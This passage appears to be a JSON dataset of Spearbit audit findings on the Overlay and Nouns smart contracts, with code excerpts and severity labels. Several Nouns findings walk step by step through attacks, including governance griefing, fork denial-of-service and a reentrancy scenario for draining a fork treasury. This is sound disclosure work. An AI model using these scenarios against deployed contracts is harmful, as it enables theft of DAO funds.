        "body": "Functions nextPositionId() and mid() in OverlayV1Market.sol are not used internally and dont appear to be useful. contract OverlayV1Market is IOverlayV1Market { function nextPositionId() external view returns (uint256) { return _totalPositions; } function mid(Oracle.Data memory data,uint256 volumeBid,uint256 volumeAsk) ... { ... } } The functions oiInitial() and oiSharesCurrent() in library Position.sol have the same implementation. The oiInitial() function does not seem useful as it retrieves current positions and not initial ones. library Position { /// @notice Computes the initial open interest of position when built ... function oiInitial(Info memory self, uint256 fraction) internal pure returns (uint256) { return _oiShares(self).mulUp(fraction); } /// @notice Computes the current shares of open interest position holds ... function oiSharesCurrent(Info memory self, uint256 fraction) internal pure returns (uint256) { return _oiShares(self).mulUp(fraction); } } 15 The function liquidationPrice() in library Position.sol is not used from the contracts. Because it type is internal it cannot be called from the outside either. library Position { function liquidationPrice(... ) internal pure returns (uint256 liqPrice_) { ... } } The variables ovlWethToken0 and ovlWethToken1 are stored but not used anymore. constructor(..., address _ovlWethPool,...) .. { ... // need OVL/WETH pool for ovl vs ETH price to make reserve conversion from ETH => OVL address _ovlWethToken0 = IUniswapV3Pool(_ovlWethPool).token0(); address _ovlWethToken1 = IUniswapV3Pool(_ovlWethPool).token1(); ... ovlWethToken0 = _ovlWethToken0; ovlWethToken1 = _ovlWethToken1; ... }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization OverlayV1Market.sol#L536-L539,"
        ]
    },
    {
        "title": "Optimize power functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "In contract OverlayV1Market.sol, several power calculations are done with EULER / INVERSE_EULER as a base which can be optimized to save gas. function dataIsValid(Oracle.Data memory data) public view returns (bool) { ... uint256 dpLowerLimit = INVERSE_EULER.powUp(pow); uint256 dpUpperLimit = EULER.powUp(pow); ... } Note: As the Overlay team confirmed, less precision might be sufficient for this calculation. OverlayV1Market.sol: fundingFactor = INVERSE_EULER.powDown(2 * k * timeElapsed); OverlayV1Market.sol: bid_ = bid_.mulDown(INVERSE_EULER.powUp(pow)); OverlayV1Market.sol: ask_ = ask_.mulUp(EULER.powUp(pow)); 16",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Redundant Math.min()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The function capNotionalAdjustedForCircuitBreaker() calculates circuitBreaker() and then does a Math.min(cap,...) with the result. However circuitBreaker() already returns a value that is <= cap. So the Math.min(...) function is unnecesary. 17 function capNotionalAdjustedForCircuitBreaker(uint256 cap) public view returns (uint256) { ... cap = Math.min(cap, circuitBreaker(snapshot, cap)); return cap; } function circuitBreaker(Roller.Snapshot memory snapshot, uint256 cap) public view returns (uint256) { ... if (minted <= int256(_circuitBreakerMintTarget)) { return cap; } else if (...) { return 0; } // so minted > _circuitBreakerMintTarget, thus minted / _circuitBreakerMintTarget > ONE ... uint256 adjustment = 2 * ONE - uint256(minted).divDown(_circuitBreakerMintTarget); // so adjustment <= ONE return cap.mulDown(adjustment); // so this is <= cap }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Replace square with multiplication",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The contract OverlayV1Market.sol contains the following expression several times: x.powDown(2 * ONE). This computes the square of x. However, it can also be calculated in a more gas efficient way: function oiAfterFunding(...) { ... uint256 underRoot = ONE - oiImbalanceBefore.divDown(oiTotalBefore).powDown(2 * ONE).mulDown( ONE - fundingFactor.powDown(2 * ONE) ); ... }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Retrieve roles via constants in import",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Within contract OverlayV1Factory.sol, the roles GOVERNOR_ROLE, MINTER_ROLE, BURNER_ROLE are retrieved via an external function call. To save gas they could also be retrieved as constants via import. Additionally, a role ADMIN_ROLE is defined in contract OverlayV1Token.sol, which is the same as DEFAULT_ADMIN_- ROLE of AccessControl.sol. This ADMIN_ROLE could be replaced with DEFAULT_ADMIN_ROLE. modifier onlyGovernor() { - + require(ovl.hasRole(ovl.GOVERNOR_ROLE(), msg.sender), \"OVLV1: !governor\"); require(ovl.hasRole(GOVERNOR_ROLE, msg.sender), \"OVLV1: !governor\"); _; } ... function deployMarket(...) { ... ovl.grantRole(ovl.MINTER_ROLE(), market_); ovl.grantRole(MINTER_ROLE, market_); ovl.grantRole(ovl.BURNER_ROLE(), market_); ovl.grantRole(BURNER_ROLE, market_); ... - + - + }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Double check action when snapAccumulator == 0 in transform()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The function transform() does a check for snapAccumulator + value == 0 (where all variables are of type int256). This could be true if value == -snapAccumulator (or snapAccumulator == value == 0) A comment shows this is to prevent division by 0 later on. The division is based on abs(snapAccumulator) + abs(value). So this will only fail when snapAccumulator == value == 0. function transform(...) ... { ... int256 accumulatorNow = snapAccumulator + value; if (accumulatorNow == 0) { // if accumulator now is zero, windowNow is simply window // to avoid 0/0 case below return ... ---> this comment might not be accurate } ... uint256 w1 = uint256(snapAccumulator >= 0 ? snapAccumulator : -snapAccumulator); // w1 = abs(snapAccumulator) uint256 w2 = uint256(value >= 0 ? value : -value); uint256 windowNow = (w1 * (snapWindow - dt) + w2 * window) / (w1 + w2); // only fails if w1 == w2 == 0 ... // w2 = abs(value) ,! ,! }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add unchecked in natural log (ln) function or remove the functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The function ln() in contract LogExpMath.sol does not use unchecked, while the function log() does. Note: Neither ln() nor log() are used, so they could also be deleted. function log(int256 arg, int256 base) internal pure returns (int256) { unchecked { ... } } function ln(int256 a) internal pure returns (int256) { // no unchecked }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Specialized functions for the long and short side",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The functions build(), unwind() and liquidate() contain a large percentage of code that is differ- ent for the long and short side.",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Beware of chain dependencies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The contracts have a few dependencies/assumptions which arent future proof and/or limit on which chain the code can be deployed. The AVERAGE_BLOCK_TIME is different on several EVM based chains. As the the Ethereum mainchain, the AVER- AGE_BLOCK_TIME will change to 12 seconds after the merge. contract OverlayV1Market is IOverlayV1Market { ... uint256 internal constant AVERAGE_BLOCK_TIME = 14; // (BAD) TODO: remove since not futureproof ... } WETH addresses are not the same on different chains. See Uniswap Wrapped Native Token Addresses. Note: Several chains have a different native token instead of ETH. 21 contract OverlayV1UniswapV3Feed is IOverlayV1UniswapV3Feed, OverlayV1Feed { address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; ... }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Move _registerMint() closer to mint() and burn()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Within functions unwind() and liquidate() there is a call to _registerMint() as well as calls to ovl.mint() and ovl.burn(). However these two are quite a few lines apart so it is not immediately obvious they are related and operate on the same values. Additionally _registerMint() also registers burns. function unwind(...) ... { ... _registerMint(int256(value) - int256(cost)); ... // 40 lines of code if (value >= cost) { ovl.mint(address(this), value - cost); } else { ovl.burn(cost - value); } ... } function liquidate(address owner, uint256 positionId) external { ... _registerMint(int256(value) - int256(cost)); ... // 33 lines of code ovl.burn(cost - value); ... }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use of Math.min() is error-prone",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Function Math.min() is used in two ways:  To get the smallest of two values, e.g. x = Math.min(x,y);  To make sure the resulting value is >=0, e.g. x -= Math.min(x,y); (note, there is an extra - in -= ) It is easy to make a mistake because both constructs are rather similar. Note: No mistakes have been found in the code. Examples to get the smallest of two values: OverlayV1Market.sol: tradingFee OverlayV1Market.sol: cap OverlayV1Market.sol: cap = Math.min(tradingFee, value); = Math.min(cap, circuitBreaker(snapshot, cap)); = Math.min(cap, backRunBound(data)); Examples to make sure the resulting value is >=0: OverlayV1Market.sol: oiLong -= Math.min(oiLong,pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide)); ,! OverlayV1Market.sol: oiLongShares OverlayV1Market.sol: oiShort oiTotalSharesOnSide)); ,! OverlayV1Market.sol: oiShortShares OverlayV1Market.sol: pos.notional OverlayV1Market.sol: pos.debt OverlayV1Market.sol: pos.oiShares OverlayV1Market.sol: oiLong oiTotalSharesOnSide)); ,! OverlayV1Market.sol: oiLongShares OverlayV1Market.sol: oiShort oiTotalSharesOnSide)); ,! OverlayV1Market.sol: oiShortShares Position.sol: posCost -= Math.min(oiLongShares, pos.oiSharesCurrent(fraction)); -= Math.min(oiShort,pos.oiCurrent(fraction, oiTotalOnSide, -= Math.min(oiShortShares, pos.oiSharesCurrent(fraction)); -= uint120( Math.min(pos.notional, pos.notionalInitial(fraction))); -= uint120( Math.min(pos.debt, pos.debtCurrent(fraction))); -= Math.min(pos.oiShares, pos.oiSharesCurrent(fraction)); -= Math.min(oiLong,pos.oiCurrent(fraction, oiTotalOnSide, -= Math.min(oiLongShares, pos.oiSharesCurrent(fraction)); -= Math.min(oiShort,pos.oiCurrent(fraction, oiTotalOnSide, -= Math.min(oiShortShares, pos.oiSharesCurrent(fraction)); -= Math.min(posCost, posDebt);",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Confusing use of term burn",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "The function oiAfterFunding() contains a comment that it burns a portion of the contracts. The term burn can be confused with burning of OVL. The Overlay team clarified that: The total aggregate open interest outstanding (oiLong + oiShort) on the market decreases over time with funding. Theres no actual burning of OVL. function oiAfterFunding(...) ... { ... // Burn portion of all aggregate contracts (i.e. oiLong + oiShort) // to compensate protocol for pro-rata share of imbalance liability ... return (oiOverweightNow, oiUnderweightNow); }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document precondition for oiAfterFunding()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Function oiAfterFunding contains the following statement: uint256 oiImbalanceBefore = oiOverweightBefore - oiUnderweightBefore; Nevertheless, if oiOverweightBefore < oiUnderweightBefore then statement will revert. Luckily, the update() function makes sure this isnt the case. function oiAfterFunding(uint256 oiOverweightBefore, uint256 oiUnderweightBefore, ...) ... { ... uint256 oiImbalanceBefore = oiOverweightBefore - oiUnderweightBefore; // Could if oiOverweightBefore < oiUnderweightBefore ... } function update() public returns (Oracle.Data memory) { ... bool isLongOverweight = oiLong > oiShort; uint256 oiOverweight two uint256 oiUnderweight = isLongOverweight ? oiShort : the two (oiOverweight, oiUnderweight) = oiAfterFunding(oiOverweight, oiUnderweight, ...); ... = isLongOverweight ? oiLong : oiShort; // oiOverweight is the largest of the oiLong; // oiUnderweight is the smallest of ,! ,! }",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Format numbers intelligibly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf",
        "body": "Solidity offers several possibilities to format numbers in a more readable way as noted below.",
        "labels": [
            "Spearbit",
            "Overlay",
            "Severity: Informational"
        ]
    },
    {
        "title": "Any signer can cancel a pending/active proposal to grief the proposal process",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Any proposal signer, besides the proposer, can cancel the proposal later irrespective of the number of votes they contributed earlier towards the threshold. The signer could even have zero votes because getPrior- Votes(signer,..) is not checked for a non-zero value in verifySignersCanBackThisProposalAndCountTheir- Votes() as part of the proposeBySigs() flow. This seems to be a limitation of the design described in hackmd.io/@el4d/nouns-dao-v3-spec#Cancel. With the signature-based scheme, every signer is as powerful as the proposer. As long as their combined votes meets threshold, it does not matter who contributed how much to the voting power. And assuming everyone contributed some non-zero power, they are all given the cancellation capability. However, for example, a signer/proposer with 0 voting power is treated on par with any other signer who contributed 10 Nouns towards meeting the proposal threshold. A malicious signer can sign-off on every valid proposal to later cancel it. The vulnerability arises from a lack of voting power check on signer and the cancel capability given to any signer. Example scenario: Evil, without having to own a single Noun, creates a valid signature to back every signature- based proposal from a different account (to bypass checkNoActiveProp()) and gets it included in the proposal creation process via proposeBySigs(). Evil then cancels every such proposal at will, i.e. no signature-based proposal that Evil manages to get included into, potentially all of them, will ever get executed. Impact: This allows a malicious griefing signer who could really be anyone without having to own any Nouns but manages to get their signature included in the proposeBySigs() to cancel that proposal later. This effectively gives anyone a veto power on all signature-based proposals. High likelihood + Medium impact = High severity.  Likelihood is High because anyone with no special ownership (of Nouns) or special roles in the protocol frontend could initiate a signature to be accepted by the proposer. We assume no other checks by e.g. because those are out-of-scope, not specified/documented, depend on the implementation, depend on their trust/threat models or may be bypassed with protocol actors interacting directly with the contracts. We cannot be sure of how the proposer decides on which signatures to include and what checks are actually made, be- cause that is done offchain. Without that information, we are assuming that proposer includes all signatures they receive.  Impact is Medium because, with the Likelihood rationale, anyone can get their signature included to later cancel a signature-backed proposal, which in the worst case (again without additional checks/logic) gives anyone a veto power on all signature-based proposals to potentially bring governance to a standstill if sig- natures are expected to be the dominant approach forward. Even if we assume that a proposer learns to exclude a zero-vote cancelling signer (with external checks) after experiencing this griefing, the signer can move on to other unsuspecting proposers. Given that this is one of the key features of V3 UX, we reason that this permissionless griefing DoS on governance to be at Medium impact. While the cancellation capability is indeed specified as the intended design, we reason that this is a risky feature for the reasons explained above. This should ideally be determined based only on the contributing voting power as suggested in our recommendation. Filtering out signers with zero voting power raises the bar from the current situation in requiring signers to have non-zero voting power (i.e. cost of griefing attack becomes non-zero) but will not prevent signers from transferring their voting power granting Noun(s) to other addresses, get new valid signatures included on other signature-based proposals and grief them later by cancelling. Equating a non-zero voting power to a veto power on all signature-based proposals in the protocol continues to be very risky.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Potential Denial of Service (DoS) attack on NounsAuctionHouseFork Contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The potential vulnerability arises during the initialization of the NounsAuctionHouseFork contract, which is deployed and initialized via the executeFork() function when a new fork is created. At this stage, the state variable startNounId within the NounsTokenFork contract is set corresponding to the nounId currently being auctioned in the NounsAuctionHouse. It should be noted that the NounsAuctionHouseFork contract is initially in a paused state and requires a successful proposal to unpause it, thus enabling the minting of new nouns tokens within the fork. Based on the current structure, an attacker can execute a DoS attack through the following steps: 7 1. Assume the executeFork() threshold is 7 nouns and the attacker owns 8 nouns. The current nounId being auctioned is 735. 2. The attacker places the highest bid for nounId 735 in the NounsAuctionHouse contract and waits for the auction's conclusion. 3. Once the auction concludes, the attacker calls escrowToFork() with his 8 nouns, triggering the execute- Fork() threshold. 4. Upon invoking executeFork(), new fork contracts are deployed. Below is the state of both NounsAuction- HouseFork and NounsAuctionHouse contracts at this juncture: NounsAuctionHouseFork state: nounId -> 0 amount -> 0 startTime -> 0 endTime -> 0 bidder -> 0x0000000000000000000000000000000000000000 settled -> false NounsAuctionHouse state: nounId -> 735 amount -> 50000000000000000000 startTime -> 1686014675 endTime -> 1686101075 bidder -> 0xE6b3367318C5e11a6eED3Cd0D850eC06A02E9b90 (attacker's address) settled -> false 5. The attacker executes settleCurrentAndCreateNewAuction() on the NounsAuctionHouse contract, thereby acquiring the nounId 735. 6. Following this, the attacker invokes joinFork() on the main DAO and joins the fork with nounId 735. This action effectively mints nounId 735 within the fork and subsequently triggers a DoS state in the NounsAuc- tionHouseFork contract. 7. At a later time, a proposal is successfully passed and the unpause() function is called on the NounsAuction- HouseFork contract. 8. A revert occurs when the _createAuction() function tries to mint tokenId 735 in the fork (which was already minted during the joinFork() call), thus re-pausing the contract. More broadly, this could happen if the buyer of the fork DAO's startNounId (and successive ones) on the original DAO (i.e. the first Nouns that get auctioned after a fork is executed) joins the fork with those tokens, even without any malicious intent, before the fork's auction is unpaused by its governance. Applying of delayed governance on fork DAO makes this timing-based behavior more feasible. One has to buy one or more of the original DAO tokens auctioned after the fork was executed and use them to join the fork immediately. The NounsAuctionHouseFork contract gets into a DoS state, necessitating a contract update in the NounsToken- Fork contract to manually increase the _currentNounId state variable to restore the normal flow in the NounsAuc- tionHouseFork. High likelihood + Medium impact = High Severity. Likelihood: High, because its a very likely scenario to happen, even unintentionally, the scenario can be triggered by a non-malicious user that just wants to join the fork with a fresh bought Noun from the auction house. Impact: Medium, because forking is bricked for at least several weeks until the upgrade proposal passes and is in place. This is not simply having a contract disabled for a period of time, this can be considered as a loss of assets for the Forked DAO as well, i.e. imagine that the Forked DAO needs funding immediately. On top of this, the contract upgrade would have to be done on the NounsTokenFork contract to correct the _currentNounId state variable to a valid value and fix the Denial of Service in the NounsAuctionHouseFork. Would the fork joiners be willing to perform such a risky update in such a critical contract?",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Total supply can be low down to zero after the fork, allowing for execution of exploiting proposals from any next joiners",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Total supply can be low down to reaching zero during forking period, so any holder then entering forked DAO with joinFork() can push manipulating proposals and force all the later joiners either to rage quit or to be exploited. As an example, if there is a group of nouns holders that performed fork for pure financial reasons, all claimed forked nouns and quitted. Right after that it is block.timestamp < forkingPeriodEndTimestamp, so isForkPe- riodActive(ds) == true in original DAO contract. In the same time forked token's adjustedTotalSupply is zero (all new tokens were sent to timelock):  NounsDAOLogicV1Fork.sol#L201-L208 function quit(uint256[] calldata tokenIds) external nonReentrant { ... for (uint256 i = 0; i < tokenIds.length; i++) { >> nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]); }  NounsDAOLogicV1Fork.sol#L742-L744 function adjustedTotalSupply() public view returns (uint256) { return nouns.totalSupply() - nouns.balanceOf(address(timelock)); } Also, NounsTokenFork.remainingTokensToClaim() == 0, so checkGovernanceActive() check does not revert in the forked DAO contract:  NounsDAOLogicV1Fork.sol#L346-L349) function checkGovernanceActive() internal view { if (block.timestamp < delayedGovernanceExpirationTimestamp && nouns.remainingTokensToClaim() > ,! 0) revert WaitingForTokensToClaimOrExpiration(); } Original DAO holders can enter new DAO with joinFork() only, that will keep checkGovernanceActive() non- reverting in the forked DAO contract: 9  NounsDAOV3Fork.sol#L139-L158 function joinFork( NounsDAOStorageV3.StorageV3 storage ds, uint256[] calldata tokenIds, uint256[] calldata proposalIds, string calldata reason ) external { ... for (uint256 i = 0; i < tokenIds.length; i++) { ds.nouns.transferFrom(msg.sender, timelock, tokenIds[i]); } >> NounsTokenFork(ds.forkDAOToken).claimDuringForkPeriod(msg.sender, tokenIds); emit JoinFork(forkEscrow.forkId() - 1, msg.sender, tokenIds, proposalIds, reason); } As remainingTokensToClaim stays zero as claimDuringForkPeriod() doesn't affect it:  NounsTokenFork.sol#L166-L174 function claimDuringForkPeriod(address to, uint256[] calldata tokenIds) external { if (msg.sender != escrow.dao()) revert OnlyOriginalDAO(); if (block.timestamp > forkingPeriodEndTimestamp) revert OnlyDuringForkingPeriod(); for (uint256 i = 0; i < tokenIds.length; i++) { uint256 nounId = tokenIds[i]; _mintWithOriginalSeed(to, nounId); } } In this situation both quorum and proposal thresholds will be zero, proposals can be created with creationBlock = block.number, at which only recently joined holder have voting power:  NounsDAOLogicV1Fork.sol#L242-L305 function propose( address[] memory targets, uint256[] memory values, string[] memory signatures, bytes[] memory calldatas, string memory description ) public returns (uint256) { checkGovernanceActive(); ProposalTemp memory temp; temp.totalSupply = adjustedTotalSupply(); >> temp.proposalThreshold = bps2Uint(proposalThresholdBPS, temp.totalSupply); require( nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold, 'NounsDAO::propose: proposer votes below proposal threshold' ); ... newProposal.proposalThreshold = temp.proposalThreshold; newProposal.quorumVotes = bps2Uint(quorumVotesBPS, temp.totalSupply); ... newProposal.creationBlock = block.number; >> >> >> 10  DeployDAOV3NewContractsBase.s.sol#L18-L23 contract DeployDAOV3NewContractsBase is Script { ... uint256 public constant FORK_DAO_PROPOSAL_THRESHOLD_BPS = 25; // 0.25% uint256 public constant FORK_DAO_QUORUM_VOTES_BPS = 1000; // 10% This will give the first joiner the full power over all the later joiners:  NounsDAOLogicV1Fork.sol#L577-L589 function castVoteInternal( address voter, uint256 proposalId, uint8 support ) internal returns (uint96) { ... /// @notice: Unlike GovernerBravo, votes are considered from the block the proposal was created >> in order to normalize quorumVotes and proposalThreshold metrics ,! uint96 votes = nouns.getPriorVotes(voter, proposal.creationBlock); Say if Bob, the original nouns DAO holder with 1 noun, joined when total supply was zero, he can create proposals and with regard for these proposals his only vote will be 100% of the DAO voting power. Bob can create a proposal to transfer all the funds to himself or a hidden malicious one like shown in Fork escrowers can exploit the fork or force late joiners to quit step 6. All the later joiners will not be able to stop this proposal, no matter how big their voting power be, as votes will be counted as on block where Bob had 100% of the votes. As the scenario above is a part of expected workflow (i.e. all fork initiators can be reasonably expected to quit fast enough), the probability of it is medium, while the probability of inattentive late joiners being exploited by Bob's proposal is medium too (there is not much time to react and some holders might first of all want to explore new fork functionality), so overall probability is low, while the impact is full loss of funds for such joiners. Per low combined likelihood and high impact setting the severity to be medium.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Duplicate ERC20 tokens will send a greater than prorata token share leading to loss of DAO funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "_setErc20TokensToIncludeInFork() is an admin function for setting ERC20 tokens that are used when splitting funds to a fork. However, there are no sanity checks for duplicate ERC20 tokens in the erc20tokens parameter. While STETH is the only ERC20 token applicable for now, it is conceivable that DAO treasury may include others in future. The same argument applies to _setErc20TokensToIncludeInQuit() and members quitting from the fork DAO. Duplicate tokens in the array will send a greater than prorata share of those tokens to the fork DAO treasury in sendProRataTreasury() or to the quitting member in quit(). This will lead to loss of funds for the original DAO and fork DAO respectively. Low likelihood + High impact = Medium severity. 12",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious proposer can create arbitrary number of maliciously updatable proposals to signifi- cantly grief the protocol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "checkNoActiveProp() is documented as: \"This is a spam protection mechanism to limit the num- ber of proposals each noun can back.\" However, this mitigation applies to proposer addresses holding Nouns but not the Nouns themselves because checkNoActiveProp() relies on checking the state of proposals tracked by proposer via latestProposalId = ds.latestProposalIds[proposer]. A malicious proposer can move (trans- fer/delegate) their Noun(s) to different addresses for circumventing this mitigation and create proposals from those new addresses to spam. Furthermore, proposal updation in the protocol does not check for the proposer meeting any voting power threshold at the time of updation. A malicious proposer can create arbitrary number of proposals, each from a different address by transferring/delegating their Nouns, and then update any/all of them to be malicious. Substantial effort will be required to differentiate all such proposals from the authentic ones and then cancel them, leading to DAO governance DoS griefing. Medium likelihood + Medium impact = Medium severity.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious proposer can update proposal past inattentive voters to sneak in otherwise unaccept- able details",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Updatable proposal description and transactions is a new feature being introduced in V3 to improve the UX of the proposal flow to allow proposal editing on-chain. The motivation for this feature as described in the spec is: \"Proposals get voter feedback almost entirely only once they are on-chain. At the same time, proposers are relunctant to cancel and resubmit their proposals for multiple reasons, e.g. prefering to avoid restarting the proposal lifecycle and thus delay funding.\" However, votes are bound only to the proposal identifier and not to their description (which describes the motiva- tion/intention/usage etc.) or the transactions (values transferred, contracts/functions of interaction etc.). Inattentive voters may (decide to) cast their votes based on a stale proposal's description/transactions which could since have been updated. For example, someone voting Yes on the initial proposal version may vote No if they see the updated details. A very small voting delay (MIN_VOTING_DELAY is 1 block) may even allow a malicious proposer to sneak in a malicious update at the very end of the updatable period so that voters do not see it on time to change their votes being cast. Delays in front-ends updating the proposal details may contribute to this scenario. A malicious proposer updates proposal with otherwise unacceptable txs/description to get support of inattentive voters who cast their votes based on acceptable older proposal versions. Malicious proposal passes to transfer a significant amount of treasury to unauthorized receivers for unacceptable reasons. Low likelihood + High impact = Medium severity.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "NounsDAOLogicV1Fork's quit() performing external calls in-between total supply and balance reads can allow for treasury funds stealing via cross-contract reentrancy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Let's suppose there is an initiative group of nouns holders that performed fork, claimed is block.timestamp < and immediately quitted (say for pure financial Right after forkingPeriodEndTimestamp, so isForkPeriodActive(ds) == true in original DAO contract, while NounsTokenFork.remainingTokensToClaim() == 0, so checkGovernanceActive() doesn't revert in the forked DAO contract, which have no material holdings. reasons). that it For simplicity let's say there is Bob and Alice, both aren't part of this group and still are in the original DAO, Bob have 2 nouns, Alice have 1, each nouns' share of treasury is 1 stETH and 100 ETH, erc20TokensToIncludeInQuit = [stETH]. All the above are going concern assumptions (a part of expected workflow), let's now have a low probability one: stETH contract was upgraded and now performs _beforetokentransfer() callback on every transfer to a destination address as long as it's a contract (i.e. it has a callback, for simplicity let's assume it behaves similarly 14 to ERC-721 safeTransfer). enough technical reason for such an upgrade. It doesn't make it malicious or breaks IERC20, let's just suppose there is a strong If Alice now decides to join this fork, Bob can steal from her: 1. Alice calls NounsDAOV3's joinFork(), 1 stETH and 100 ETH is transferred to NounsDAOLogicV1Fork:  NounsDAOV3Fork.sol#L139-L158 function joinFork( NounsDAOStorageV3.StorageV3 storage ds, uint256[] calldata tokenIds, uint256[] calldata proposalIds, string calldata reason ) external { if (!isForkPeriodActive(ds)) revert ForkPeriodNotActive(); INounsDAOForkEscrow forkEscrow = ds.forkEscrow; address timelock = address(ds.timelock); sendProRataTreasury(ds, ds.forkDAOTreasury, tokenIds.length, adjustedTotalSupply(ds)); for (uint256 i = 0; i < tokenIds.length; i++) { ds.nouns.transferFrom(msg.sender, timelock, tokenIds[i]); } NounsTokenFork(ds.forkDAOToken).claimDuringForkPeriod(msg.sender, tokenIds); emit JoinFork(forkEscrow.forkId() - 1, msg.sender, tokenIds, proposalIds, reason); } Alice is minted 1 forked noun:  NounsTokenFork.sol#L166-L174) function claimDuringForkPeriod(address to, uint256[] calldata tokenIds) external { if (msg.sender != escrow.dao()) revert OnlyOriginalDAO(); if (block.timestamp > forkingPeriodEndTimestamp) revert OnlyDuringForkingPeriod(); for (uint256 i = 0; i < tokenIds.length; i++) { uint256 nounId = tokenIds[i]; _mintWithOriginalSeed(to, nounId); } } 2. Bob transfers all to attack contract (cBob), that joins the DAO with 1 noun. Forked treasury is 2 stETH and 200 ETH, cBob and Alice both have 1 noun. 3. cBob calls quit() and reenters NounsDAOV3's joinFork() on stETH _beforetokentransfer() (and nothing else):  NounsDAOLogicV1Fork.sol#L201-L222 15 function quit(uint256[] calldata tokenIds) external nonReentrant { checkGovernanceActive(); uint256 totalSupply = adjustedTotalSupply(); for (uint256 i = 0; i < tokenIds.length; i++) { nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]); } for (uint256 i = 0; i < erc20TokensToIncludeInQuit.length; i++) { IERC20 erc20token = IERC20(erc20TokensToIncludeInQuit[i]); uint256 tokensToSend = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply; ,! bool erc20Sent = timelock.sendERC20(msg.sender, address(erc20token), tokensToSend); if (!erc20Sent) revert QuitERC20TransferFailed(); >> } uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply; bool ethSent = timelock.sendETH(msg.sender, ethToSend); if (!ethSent) revert QuitETHTransferFailed(); emit Quit(msg.sender, tokenIds); } 4. cBob have joined fork with another noun, stETH transfer concludes. Forked treasury is 2 stETH and 300 ETH, while 1 stETH was just sent to cBob. 5. With quit() resumed, (address(timelock).balance * tokenIds.length) / totalSupply = (300 * 1) / 2 = 150 ETH is sent to cBob:  NounsDAOLogicV1Fork.sol#L201-L222 function quit(uint256[] calldata tokenIds) external nonReentrant { checkGovernanceActive(); uint256 totalSupply = adjustedTotalSupply(); for (uint256 i = 0; i < tokenIds.length; i++) { nouns.transferFrom(msg.sender, address(timelock), 